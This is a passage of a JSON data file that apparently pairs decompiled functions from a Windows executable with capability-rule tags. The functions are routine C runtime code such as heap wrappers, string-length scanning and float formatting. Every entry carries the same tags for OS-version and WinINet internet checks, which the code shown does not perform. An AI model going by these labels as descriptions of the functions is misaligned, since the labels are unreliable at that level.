        "decompiled_code": "\nuint32_t __cdecl fcn.0045c29e(int32_t arg_8h, uint32_t arg_ch, int32_t **arg_10h)\n\n{\n    uint arg_8h_00;\n    uint32_t uVar1;\n    \n    if (arg_10h == NULL) {\n        arg_8h_00 = fcn.0046656a();\n        uVar1 = fcn.00455ad2(arg_8h_00, arg_8h, arg_ch);\n        return uVar1;\n    }\n    if (arg_8h + 1U < 0x101) {\n        arg_ch = *(**arg_10h + arg_8h * 2) & arg_ch;\n    }\n    else if ((*arg_10h)[1] < 2) {\n        arg_ch = 0;\n    }\n    else {\n        arg_ch = fcn.00468dca(arg_8h, arg_ch, arg_10h);\n    }\n    return arg_ch;\n}\n",
        "token_count": 221
    },
    "0045d185": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d185(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x6cdab0, 0, arg_8h);\n        if (iVar1 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = fcn.0043bc18(uVar2);\n            puVar3 = fcn.0043bcb5();\n            *puVar3 = uVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0045d218": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045d218(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == 0) {\n        puVar1 = fcn.0043bcb5();\n        *puVar1 = 0x16;\n        fcn.0043bb3e();\n        return 0xffffffff;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapSize)(*0x6cdab0, 0, arg_8h);\n    return uVar2;\n}\n",
        "token_count": 128
    },
    "0045d3ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045d3ea(uchar (*arg_8h) [32], uint32_t arg_ch)\n\n{\n    uchar *puVar1;\n    uchar (*pauVar2) [32];\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar auVar5 [16];\n    uchar auVar6 [32];\n    uchar in_YMM1 [32];\n    uint8_t uVar7;\n    \n    if (*0x6ccba8 < 5) {\n        if (*0x6ccba8 < 1) {\n            pauVar2 = arg_8h;\n            if (arg_8h != *arg_8h + arg_ch) {\n                do {\n                    if ((*pauVar2)[0] == '\\0') break;\n                    pauVar2 = *pauVar2 + 1;\n                } while (pauVar2 != *arg_8h + arg_ch);\n            }\n            uVar3 = pauVar2 - arg_8h;\n        }\n        else {\n            uVar4 = -((arg_8h & 0xf) != 0) & 0x10 - (arg_8h & 0xf);\n            if (arg_ch < uVar4) {\n                uVar4 = arg_ch;\n            }\n            pauVar2 = arg_8h;\n            if (arg_8h != *arg_8h + uVar4) {\n                do {\n                    if ((*pauVar2)[0] == '\\0') break;\n                    pauVar2 = *pauVar2 + 1;\n                } while (pauVar2 != *arg_8h + uVar4);\n            }\n            uVar3 = pauVar2 - arg_8h;\n            if (uVar3 == uVar4) {\n                puVar1 = *pauVar2;\n                while ((pauVar2 != puVar1 + (arg_ch - uVar4 & 0xfffffff0) &&\n                       (uVar7 = -((*pauVar2)[0xf] == '\\0'), \n                       auVar5 = CONCAT115(uVar7, CONCAT114(-((*pauVar2)[0xe] == '\\0'), \n                                                           CONCAT113(-((*pauVar2)[0xd] == '\\0'), \n                                                                     CONCAT112(-((*pauVar2)[0xc] == '\\0'), \n                                                                               CONCAT111(-((*pauVar2)[0xb] == '\\0'), \n                                                                                         CONCAT110(-((*pauVar2)[10] ==\n                                                                                                    '\\0'), CONCAT19(-((*\n                                                            pauVar2)[9] == '\\0'), \n                                                            CONCAT18(-((*pauVar2)[8] == '\\0'), \n                                                                     CONCAT17(-((*pauVar2)[7] == '\\0'), \n                                                                              CONCAT16(-((*pauVar2)[6] == '\\0'), \n                                                                                       CONCAT15(-((*pauVar2)[5] == '\\0')\n                                                                                                , CONCAT14(-((*pauVar2)\n                                                                                                             [4] == '\\0'\n                                                                                                            ), CONCAT13(\n                                                            -((*pauVar2)[3] == '\\0'), \n                                                            CONCAT12(-((*pauVar2)[2] == '\\0'), \n                                                                     CONCAT11(-((*pauVar2)[1] == '\\0'), \n                                                                              -((*pauVar2)[0] == '\\0')))))))))))))))), \n                       (SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar5 >> 0x27, 0) & 1) << 4 | (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar5 >> 0x37, 0) & 1) << 6 | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar5 >> 0x57, 0) & 1) << 10 | (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe | (uVar7 >> 7) << 0xf) == 0))) {\n                    pauVar2 = *pauVar2 + 0x10;\n                }\n                for (; (pauVar2 != *arg_8h + arg_ch && ((*pauVar2)[0] != '\\0')); pauVar2 = *pauVar2 + 1) {\n                }\n                uVar3 = pauVar2 - arg_8h;\n            }\n        }\n    }\n    else {\n        uVar4 = -((arg_8h & 0x1f) != 0) & 0x20 - (arg_8h & 0x1f);\n        if (arg_ch < uVar4) {\n            uVar4 = arg_ch;\n        }\n        pauVar2 = arg_8h;\n        if (arg_8h != *arg_8h + uVar4) {\n            do {\n                if ((*pauVar2)[0] == '\\0') break;\n                pauVar2 = *pauVar2 + 1;\n            } while (pauVar2 != *arg_8h + uVar4);\n        }\n        uVar3 = pauVar2 - arg_8h;\n        if (uVar3 == uVar4) {\n            puVar1 = *pauVar2;\n            auVar5 = vpxor_avx(SUB3216(in_YMM1, 0), SUB3216(in_YMM1, 0));\n            while ((pauVar2 != puVar1 + (arg_ch - uVar4 & 0xffffffe0) &&\n                   (auVar6 = vpcmpeqb_avx2(ZEXT1632(auVar5), *pauVar2), \n                   (SUB321(auVar6 >> 7, 0) & 1 | (SUB321(auVar6 >> 0xf, 0) & 1) << 1 |\n                    (SUB321(auVar6 >> 0x17, 0) & 1) << 2 | (SUB321(auVar6 >> 0x1f, 0) & 1) << 3 |\n                    (SUB321(auVar6 >> 0x27, 0) & 1) << 4 | (SUB321(auVar6 >> 0x2f, 0) & 1) << 5 |\n                    (SUB321(auVar6 >> 0x37, 0) & 1) << 6 | (SUB321(auVar6 >> 0x3f, 0) & 1) << 7 |\n                    (SUB321(auVar6 >> 0x47, 0) & 1) << 8 | (SUB321(auVar6 >> 0x4f, 0) & 1) << 9 |\n                    (SUB321(auVar6 >> 0x57, 0) & 1) << 10 | (SUB321(auVar6 >> 0x5f, 0) & 1) << 0xb |\n                    (SUB321(auVar6 >> 0x67, 0) & 1) << 0xc | (SUB321(auVar6 >> 0x6f, 0) & 1) << 0xd |\n                    (SUB321(auVar6 >> 0x77, 0) & 1) << 0xe | SUB321(auVar6 >> 0x7f, 0) << 0xf |\n                    (SUB321(auVar6 >> 0x87, 0) & 1) << 0x10 | (SUB321(auVar6 >> 0x8f, 0) & 1) << 0x11 |\n                    (SUB321(auVar6 >> 0x97, 0) & 1) << 0x12 | (SUB321(auVar6 >> 0x9f, 0) & 1) << 0x13 |\n                    (SUB321(auVar6 >> 0xa7, 0) & 1) << 0x14 | (SUB321(auVar6 >> 0xaf, 0) & 1) << 0x15 |\n                    (SUB321(auVar6 >> 0xb7, 0) & 1) << 0x16 | SUB321(auVar6 >> 0xbf, 0) << 0x17 |\n                    (SUB321(auVar6 >> 199, 0) & 1) << 0x18 | (SUB321(auVar6 >> 0xcf, 0) & 1) << 0x19 |\n                    (SUB321(auVar6 >> 0xd7, 0) & 1) << 0x1a | (SUB321(auVar6 >> 0xdf, 0) & 1) << 0x1b |\n                    (SUB321(auVar6 >> 0xe7, 0) & 1) << 0x1c | (SUB321(auVar6 >> 0xef, 0) & 1) << 0x1d |\n                    (SUB321(auVar6 >> 0xf7, 0) & 1) << 0x1e | SUB321(auVar6 >> 0xff, 0) << 0x1f) == 0))) {\n                pauVar2 = pauVar2[1];\n            }\n            for (; (pauVar2 != *arg_8h + arg_ch && ((*pauVar2)[0] != '\\0')); pauVar2 = *pauVar2 + 1) {\n            }\n            uVar3 = pauVar2 - arg_8h;\n            vzeroupper_avx();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 2381
    },
    "0045dadd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045dadd(uchar (*arg_8h) [32], uint32_t arg_ch)\n\n{\n    uchar *puVar1;\n    uchar (*pauVar2) [32];\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar auVar5 [16];\n    uchar auVar6 [32];\n    uchar in_YMM1 [32];\n    uint8_t uVar7;\n    \n    if (*0x6ccba8 < 5) {\n        if (*0x6ccba8 < 1) {\n            pauVar2 = arg_8h;\n            if (arg_8h != *arg_8h + arg_ch) {\n                do {\n                    if ((*pauVar2)[0] == '\\0') break;\n                    pauVar2 = *pauVar2 + 1;\n                } while (pauVar2 != *arg_8h + arg_ch);\n            }\n            uVar3 = pauVar2 - arg_8h;\n        }\n        else {\n            uVar4 = -((arg_8h & 0xf) != 0) & 0x10 - (arg_8h & 0xf);\n            if (arg_ch < uVar4) {\n                uVar4 = arg_ch;\n            }\n            pauVar2 = arg_8h;\n            if (arg_8h != *arg_8h + uVar4) {\n                do {\n                    if ((*pauVar2)[0] == '\\0') break;\n                    pauVar2 = *pauVar2 + 1;\n                } while (pauVar2 != *arg_8h + uVar4);\n            }\n            uVar3 = pauVar2 - arg_8h;\n            if (uVar3 == uVar4) {\n                puVar1 = *pauVar2;\n                while ((pauVar2 != puVar1 + (arg_ch - uVar4 & 0xfffffff0) &&\n                       (uVar7 = -((*pauVar2)[0xf] == '\\0'), \n                       auVar5 = CONCAT115(uVar7, CONCAT114(-((*pauVar2)[0xe] == '\\0'), \n                                                           CONCAT113(-((*pauVar2)[0xd] == '\\0'), \n                                                                     CONCAT112(-((*pauVar2)[0xc] == '\\0'), \n                                                                               CONCAT111(-((*pauVar2)[0xb] == '\\0'), \n                                                                                         CONCAT110(-((*pauVar2)[10] ==\n                                                                                                    '\\0'), CONCAT19(-((*\n                                                            pauVar2)[9] == '\\0'), \n                                                            CONCAT18(-((*pauVar2)[8] == '\\0'), \n                                                                     CONCAT17(-((*pauVar2)[7] == '\\0'), \n                                                                              CONCAT16(-((*pauVar2)[6] == '\\0'), \n                                                                                       CONCAT15(-((*pauVar2)[5] == '\\0')\n                                                                                                , CONCAT14(-((*pauVar2)\n                                                                                                             [4] == '\\0'\n                                                                                                            ), CONCAT13(\n                                                            -((*pauVar2)[3] == '\\0'), \n                                                            CONCAT12(-((*pauVar2)[2] == '\\0'), \n                                                                     CONCAT11(-((*pauVar2)[1] == '\\0'), \n                                                                              -((*pauVar2)[0] == '\\0')))))))))))))))), \n                       (SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar5 >> 0x27, 0) & 1) << 4 | (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar5 >> 0x37, 0) & 1) << 6 | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar5 >> 0x57, 0) & 1) << 10 | (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe | (uVar7 >> 7) << 0xf) == 0))) {\n                    pauVar2 = *pauVar2 + 0x10;\n                }\n                for (; (pauVar2 != *arg_8h + arg_ch && ((*pauVar2)[0] != '\\0')); pauVar2 = *pauVar2 + 1) {\n                }\n                uVar3 = pauVar2 - arg_8h;\n            }\n        }\n    }\n    else {\n        uVar4 = -((arg_8h & 0x1f) != 0) & 0x20 - (arg_8h & 0x1f);\n        if (arg_ch < uVar4) {\n            uVar4 = arg_ch;\n        }\n        pauVar2 = arg_8h;\n        if (arg_8h != *arg_8h + uVar4) {\n            do {\n                if ((*pauVar2)[0] == '\\0') break;\n                pauVar2 = *pauVar2 + 1;\n            } while (pauVar2 != *arg_8h + uVar4);\n        }\n        uVar3 = pauVar2 - arg_8h;\n        if (uVar3 == uVar4) {\n            puVar1 = *pauVar2;\n            auVar5 = vpxor_avx(SUB3216(in_YMM1, 0), SUB3216(in_YMM1, 0));\n            while ((pauVar2 != puVar1 + (arg_ch - uVar4 & 0xffffffe0) &&\n                   (auVar6 = vpcmpeqb_avx2(ZEXT1632(auVar5), *pauVar2), \n                   (SUB321(auVar6 >> 7, 0) & 1 | (SUB321(auVar6 >> 0xf, 0) & 1) << 1 |\n                    (SUB321(auVar6 >> 0x17, 0) & 1) << 2 | (SUB321(auVar6 >> 0x1f, 0) & 1) << 3 |\n                    (SUB321(auVar6 >> 0x27, 0) & 1) << 4 | (SUB321(auVar6 >> 0x2f, 0) & 1) << 5 |\n                    (SUB321(auVar6 >> 0x37, 0) & 1) << 6 | (SUB321(auVar6 >> 0x3f, 0) & 1) << 7 |\n                    (SUB321(auVar6 >> 0x47, 0) & 1) << 8 | (SUB321(auVar6 >> 0x4f, 0) & 1) << 9 |\n                    (SUB321(auVar6 >> 0x57, 0) & 1) << 10 | (SUB321(auVar6 >> 0x5f, 0) & 1) << 0xb |\n                    (SUB321(auVar6 >> 0x67, 0) & 1) << 0xc | (SUB321(auVar6 >> 0x6f, 0) & 1) << 0xd |\n                    (SUB321(auVar6 >> 0x77, 0) & 1) << 0xe | SUB321(auVar6 >> 0x7f, 0) << 0xf |\n                    (SUB321(auVar6 >> 0x87, 0) & 1) << 0x10 | (SUB321(auVar6 >> 0x8f, 0) & 1) << 0x11 |\n                    (SUB321(auVar6 >> 0x97, 0) & 1) << 0x12 | (SUB321(auVar6 >> 0x9f, 0) & 1) << 0x13 |\n                    (SUB321(auVar6 >> 0xa7, 0) & 1) << 0x14 | (SUB321(auVar6 >> 0xaf, 0) & 1) << 0x15 |\n                    (SUB321(auVar6 >> 0xb7, 0) & 1) << 0x16 | SUB321(auVar6 >> 0xbf, 0) << 0x17 |\n                    (SUB321(auVar6 >> 199, 0) & 1) << 0x18 | (SUB321(auVar6 >> 0xcf, 0) & 1) << 0x19 |\n                    (SUB321(auVar6 >> 0xd7, 0) & 1) << 0x1a | (SUB321(auVar6 >> 0xdf, 0) & 1) << 0x1b |\n                    (SUB321(auVar6 >> 0xe7, 0) & 1) << 0x1c | (SUB321(auVar6 >> 0xef, 0) & 1) << 0x1d |\n                    (SUB321(auVar6 >> 0xf7, 0) & 1) << 0x1e | SUB321(auVar6 >> 0xff, 0) << 0x1f) == 0))) {\n                pauVar2 = pauVar2[1];\n            }\n            for (; (pauVar2 != *arg_8h + arg_ch && ((*pauVar2)[0] != '\\0')); pauVar2 = *pauVar2 + 1) {\n            }\n            uVar3 = pauVar2 - arg_8h;\n            vzeroupper_avx();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 2380
    },
    "0045e0ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x0045e3e4)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0045e0ee(uint32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, \n            uint arg_20h, uint arg_24h, uint arg_28h, int32_t arg_2ch)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint16_t uVar9;\n    uint32_t uVar10;\n    char *pcVar11;\n    char *pcVar12;\n    bool bVar13;\n    int64_t iVar14;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_1ch < 0) {\n        arg_1ch = 0;\n    }\n    *arg_ch = 0;\n    if (arg_10h <= arg_1ch + 0xbU) {\n        *(arg_2ch + 0x1c) = 1;\n        *(arg_2ch + 0x18) = 0x22;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_2ch);\n        return 0x22;\n    }\n    if ((arg_8h[1] >> 0x14 & 0x7ff) == 0x7ff) {\n        iVar5 = fcn.0045e41b(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, 0, arg_24h, arg_28h, arg_2ch);\n        if (iVar5 != 0) {\n            *arg_ch = 0;\n            return iVar5;\n        }\n        pcVar6 = fcn.00479fc0(arg_ch, 0x65);\n        if (pcVar6 == NULL) {\n            return 0;\n        }\n        *pcVar6 = (arg_20h ^ 1) * ' ' + 'P';\n        pcVar6[3] = '\\0';\n        return 0;\n    }\n    if ((arg_8h[1] < 1) && (arg_8h[1] < 0)) {\n        *arg_ch = 0x2d;\n        arg_ch = arg_ch + 1;\n    }\n    pcVar6 = arg_ch + 1;\n    iVar2 = (arg_20h ^ 1) * 0x20 + 7;\n    var_10h = 0x3ff;\n    if ((arg_8h[1] & 0x7ff00000) == 0) {\n        *arg_ch = 0x30;\n        if ((*arg_8h | arg_8h[1] & 0xfffff) == 0) {\n            var_10h = 0;\n        }\n        else {\n            var_10h = 0x3fe;\n        }\n    }\n    else {\n        *arg_ch = 0x31;\n    }\n    pcVar11 = arg_ch + 2;\n    if (arg_1ch == 0) {\n        cVar1 = '\\0';\n    }\n    else {\n        if (*(arg_2ch + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        cVar1 = ***(*(arg_2ch + 0xc) + 0x88);\n    }\n    *pcVar6 = cVar1;\n    if (((arg_8h[1] & 0xfffff) != 0) || (*arg_8h != 0)) {\n        uVar9 = 0x30;\n        var_18h = 0xf0000;\n        var_14h = 0;\n        while (0 < arg_1ch) {\n            iVar3 = fcn.00476f00();\n            uVar4 = iVar3 + 0x30;\n            if (0x39 < uVar4) {\n                uVar4 = uVar4 + iVar2;\n            }\n            *pcVar11 = uVar4;\n            uVar9 = uVar9 - 4;\n            pcVar11 = pcVar11 + 1;\n            var_14h = var_14h >> 4 | var_18h << 0x1c;\n            var_18h = var_18h >> 4;\n            arg_1ch = arg_1ch + -1;\n            if (uVar9 < 0) goto code_r0x0045e302;\n        }\n        cVar1 = fcn.0045e92e(arg_8h, var_14h, var_18h, uVar9, arg_28h);\n        pcVar12 = pcVar11;\n        if (cVar1 == '\\0') goto code_r0x0045e316;\n        while( true ) {\n            pcVar7 = pcVar12 + -1;\n            var_28h._0_1_ = *pcVar7;\n            if ((var_28h != 'f') && (var_28h != 'F')) break;\n            *pcVar7 = '0';\n            pcVar12 = pcVar7;\n        }\n        if (pcVar7 == pcVar6) {\n            pcVar12[-2] = pcVar12[-2] + '\\x01';\n        }\n        else {\n            if (var_28h == '9') {\n                var_28h._0_1_ = iVar2;\n                var_28h._0_1_ = var_28h + '9';\n            }\n            *pcVar7 = var_28h + '\\x01';\n        }\n    }\ncode_r0x0045e302:\n    if (0 < arg_1ch) {\n        fcn.00431db0(pcVar11, 0x30, arg_1ch);\n        pcVar11 = pcVar11 + arg_1ch;\n    }\ncode_r0x0045e316:\n    if (*pcVar6 == '\\0') {\n        pcVar11 = pcVar6;\n    }\n    *pcVar11 = (arg_20h ^ 1) * ' ' + 'P';\n    uVar8 = fcn.00476f00();\n    pcVar6 = pcVar11 + 2;\n    uVar10 = (uVar8 & 0x7ff) - var_10h;\n    uVar8 = (uVar8 & 0x7ff) < var_10h;\n    iVar5 = -uVar8;\n    if (uVar8 == 0) {\n        cVar1 = '+';\n    }\n    else {\n        bVar13 = uVar10 != 0;\n        uVar10 = -uVar10;\n        iVar5 = -(iVar5 + bVar13);\n        cVar1 = '-';\n    }\n    iVar14 = CONCAT44(iVar5, uVar10);\n    pcVar11[1] = cVar1;\n    *pcVar6 = '0';\n    pcVar12 = pcVar6;\n    if (iVar5 < 0) goto code_r0x0045e409;\n    if ((iVar5 < 1) && (uVar10 < 1000)) {\ncode_r0x0045e3ac:\n        uVar10 = iVar14;\n        if (iVar14 < 0) goto code_r0x0045e409;\n        if ((0xffffffff < iVar14) || (99 < uVar10)) goto code_r0x0045e3b7;\ncode_r0x0045e3de:\n        uVar10 = iVar14;\n        if (iVar14 < 10) goto code_r0x0045e409;\n    }\n    else {\n        cVar1 = fcn.00476cf0(uVar10, iVar5, 1000, 0);\n        *pcVar6 = cVar1 + '0';\n        pcVar12 = pcVar11 + 3;\n        iVar14 = fcn.00476da0(uVar10, iVar5, 1000, 0);\n        if (pcVar12 == pcVar6) goto code_r0x0045e3ac;\ncode_r0x0045e3b7:\n        cVar1 = fcn.00476cf0(iVar14, 100, 0);\n        *pcVar12 = cVar1 + '0';\n        pcVar12 = pcVar12 + 1;\n        iVar14 = fcn.00476da0(iVar14, 100, 0);\n        if (pcVar12 == pcVar6) goto code_r0x0045e3de;\n    }\n    cVar1 = fcn.00476cf0(iVar14, 10, 0);\n    *pcVar12 = cVar1 + '0';\n    pcVar12 = pcVar12 + 1;\n    uVar10 = fcn.00476da0(iVar14, 10, 0);\ncode_r0x0045e409:\n    *pcVar12 = uVar10 + '0';\n    pcVar12[1] = '\\0';\n    return 0;\n}\n",
        "token_count": 2141
    },
    "0045e4bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0045e4bf(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            uint arg_20h, int32_t arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *arg_ch_00;\n    uint uVar3;\n    uchar *puVar4;\n    \n    iVar2 = arg_10h;\n    if (arg_10h < 1) {\n        iVar2 = 0;\n    }\n    if (iVar2 + 9U < arg_ch) {\n        if (arg_20h != 0) {\n            fcn.0045e8fa(arg_8h, arg_ch, arg_8h + (*arg_1ch == 0x2d), 0 < arg_10h);\n        }\n        puVar4 = arg_8h;\n        if (*arg_1ch == 0x2d) {\n            *arg_8h = 0x2d;\n            puVar4 = arg_8h + 1;\n        }\n        if (0 < arg_10h) {\n            *puVar4 = puVar4[1];\n            puVar4 = puVar4 + 1;\n            if (*(arg_24h + 0x14) == '\\0') {\n                fcn.00453bd0();\n            }\n            *puVar4 = ***(*(arg_24h + 0xc) + 0x88);\n        }\n        puVar4 = puVar4 + (arg_20h ^ 1) + arg_10h;\n        arg_ch_00 = 0xffffffff;\n        if (arg_ch != 0xffffffff) {\n            arg_ch_00 = arg_8h + (arg_ch - puVar4);\n        }\n        iVar2 = fcn.0045acc6(puVar4, arg_ch_00, \"e+000\");\n        if (iVar2 != 0) {\n            fcn.0043bb6b(0, 0, 0, 0, 0);\n            pcVar1 = swi(3);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n        if (arg_14h != '\\0') {\n            *puVar4 = 0x45;\n        }\n        if (*arg_1ch[2] != '0') {\n            iVar2 = arg_1ch[1] + -1;\n            if (iVar2 < 0) {\n                iVar2 = -iVar2;\n                puVar4[1] = 0x2d;\n            }\n            if (99 < iVar2) {\n                puVar4[2] = puVar4[2] + iVar2 / 100;\n                iVar2 = iVar2 % 100;\n            }\n            if (9 < iVar2) {\n                puVar4[3] = puVar4[3] + iVar2 / 10;\n                iVar2 = iVar2 % 10;\n            }\n            puVar4[4] = puVar4[4] + iVar2;\n        }\n        if ((arg_18h == 2) && (puVar4[2] == '0')) {\n            fcn.00431830(puVar4 + 2, puVar4 + 3, 3);\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x22;\n        *(arg_24h + 0x1c) = 1;\n        *(arg_24h + 0x18) = 0x22;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_24h);\n    }\n    return uVar3;\n}\n",
        "token_count": 845
    },
    "0045e6a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045e6a8(uchar *arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uchar *var_4h;\n    \n    bVar1 = false;\n    if ((arg_18h != '\\0') && (arg_14h[1] + -1 == arg_10h)) {\n        *(arg_8h + (*arg_14h == 0x2d) + arg_14h[1] + -1) = 0x30;\n    }\n    var_4h = arg_8h;\n    if (*arg_14h == 0x2d) {\n        var_4h = arg_8h + 1;\n        *arg_8h = 0x2d;\n    }\n    iVar2 = arg_14h[1];\n    if (iVar2 < 1) {\n        if ((iVar2 == 0) && (*arg_14h[2] == '0')) {\n            bVar1 = true;\n        }\n        if ((arg_18h == '\\0') || (!bVar1)) {\n            fcn.0045e8fa(arg_8h, arg_ch, var_4h, 1);\n        }\n        *var_4h = 0x30;\n        iVar2 = 1;\n    }\n    var_4h = var_4h + iVar2;\n    if (0 < arg_10h) {\n        fcn.0045e8fa(arg_8h, arg_ch, var_4h, 1);\n        if (*(arg_1ch + 0x14) == '\\0') {\n            fcn.00453bd0();\n        }\n        *var_4h = ***(*(arg_1ch + 0xc) + 0x88);\n        if (arg_14h[1] < 0) {\n            iVar2 = -arg_14h[1];\n            if ((arg_18h != '\\0') || (iVar2 < arg_10h)) {\n                arg_10h = iVar2;\n            }\n            fcn.0045e8fa(arg_8h, arg_ch, var_4h + 1, arg_10h);\n            fcn.00431db0(var_4h + 1, 0x30, arg_10h);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 558
    },
    "0045e92e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045e9b8)\n\nuint32_t __cdecl fcn.0045e92e(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int16_t iVar3;\n    \n    uVar1 = fcn.00476f00();\n    if (arg_18h == 0) {\n        uVar1 = uVar1 & 0xffffff00 | 1 - ((uVar1 & 0xffff) < 8);\n    }\n    else {\n        uVar2 = fcn.0046cc3c();\n        if (uVar2 == 0) {\n            uVar1 = fcn.0045e04b(arg_8h, arg_ch, arg_10h, arg_14h);\n        }\n        else {\n            iVar3 = uVar1 & 0xffff;\n            if (uVar2 == 0x200) {\n                if (iVar3 == 0) {\n                    return 0;\n                }\n                if (*(arg_8h + 4) < 0) {\n                    return 0;\n                }\n            }\n            else {\n                if (uVar2 != 0x100) {\n                    return uVar2 & 0xffffff00;\n                }\n                if (iVar3 == 0) {\n                    return 0;\n                }\n                if (0 < *(arg_8h + 4)) {\n                    return 0;\n                }\n                if (-1 < *(arg_8h + 4)) {\n                    return 0;\n                }\n            }\n            uVar1 = 1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 388
    },
    "0045e9cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
